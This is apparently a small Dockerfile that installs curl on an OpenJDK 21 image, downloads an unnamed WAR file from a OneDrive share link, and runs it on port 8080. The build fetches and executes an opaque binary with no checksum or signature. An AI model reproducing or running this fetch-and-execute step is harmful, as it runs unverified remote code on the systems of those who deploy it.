FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.dm.files.1drv.com/y4msgEiPdJhcCeJDwrGczSeAC51gfhkrRDMCGv6tS_j-n2yqLkF6d7P54CxXupYaqEh98YqUlQ8itQPOwuXgokJ6xgrD5uXQFK94F3pa9-xSwMLt_l2UfVPJywjCL1uw2U_CEsifWksJqnUQhwB1ZluEMGgcmdgkK2V_whzWKkT37qqbavBgl9Gv6dp9yY5rE5IYU1-PdjcWvOzIqwb2kzCaD3t6f1lmsPO6lPldlODQ3I?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
